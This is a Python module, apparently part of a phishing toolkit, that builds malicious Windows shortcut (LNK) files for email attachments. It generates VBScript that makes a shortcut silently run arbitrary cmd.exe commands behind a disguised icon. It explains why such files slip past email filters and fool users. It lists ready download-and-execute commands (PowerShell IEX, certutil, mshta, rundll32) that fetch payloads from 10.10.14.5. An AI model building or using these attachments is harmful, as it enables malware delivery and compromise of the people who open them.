"""
Windows LNK file creator
"""
import os
from ..core.attachment import Attachment, AttachmentType

class LNKCreator:
    """Create malicious Windows shortcut files"""
    
    def __init__(self, output_dir: str):
        """
        Initialize LNK creator
        
        Args:
            output_dir: Output directory
        """
        self.output_dir = output_dir
    
    def create_lnk(self, command: str,
                  output_name: str = "document.lnk",
                  icon_path: str = None) -> Attachment:
        """
        Create malicious LNK file
        
        Args:
            command: Command to execute
            output_name: Output filename
            icon_path: Icon file path (optional)
            
        Returns:
            Attachment object
        """
        output_path = os.path.join(self.output_dir, output_name)
        
        print(f"[*] Creating malicious LNK file: {output_name}")
        print(f"[*] Command: {command}")
        
        print("\n[!] LNK creation requires Windows or specialized tools")
        print("[!] Options:")
        print("    1. Windows VBScript:")
        print(self._generate_vbs_script(command, output_path))
        print("\n    2. Python pylnk3 library")
        print("    3. Manual creation in Windows")
        
        print("\n[*] Why LNK files work:")
        print("    • Trusted file type (Windows shortcuts)")
        print("    • Can execute arbitrary commands")
        print("    • Icon can hide true purpose")
        print("    • Often bypass email filters")
        print("    • Users click shortcuts regularly")
        
        print("\n[*] Common LNK attack patterns:")
        print("    • PowerShell download and execute")
        print("    • CMD obfuscated commands")
        print("    • Reference to network share")
        print("    • Chain multiple commands")
        
        return Attachment(
            name=output_name,
            attachment_type=AttachmentType.LNK,
            output_path=output_path,
            command=command
        )
    
    def _generate_vbs_script(self, command: str, output_path: str) -> str:
        """Generate VBScript to create LNK file"""
        vbs = f'''
Set objShell = CreateObject("WScript.Shell")
Set objLink = objShell.CreateShortcut("{output_path}")
objLink.TargetPath = "cmd.exe"
objLink.Arguments = "/c {command}"
objLink.WorkingDirectory = "%TEMP%"
objLink.WindowStyle = 7
objLink.IconLocation = "%SystemRoot%\\System32\\shell32.dll,1"
objLink.Save
'''
        return vbs
    
    def generate_example_commands(self) -> dict:
        """Generate example malicious commands for LNK files"""
        return {
            'powershell_download': 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.5/payload.ps1\')"',
            'encoded_powershell': 'powershell -w hidden -enc BASE64_ENCODED_COMMAND',
            'cmd_download': 'cmd /c certutil -urlcache -split -f http://10.10.14.5/payload.exe %TEMP%\\update.exe && %TEMP%\\update.exe',
            'mshta_download': 'mshta http://10.10.14.5/payload.hta',
            'rundll32_download': 'rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell IEX(...")'
        }